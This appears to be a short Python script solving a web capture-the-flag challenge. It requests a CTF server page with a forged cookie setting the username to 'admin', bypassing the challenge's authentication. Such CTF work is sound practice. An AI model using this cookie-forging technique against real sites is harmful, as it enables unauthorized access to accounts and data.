import requests
cookies = {"username": "admin"}
r = requests.get("https://ctfpwnable.blacktr.org/web2.php", cookies=cookies)
print(r.text)
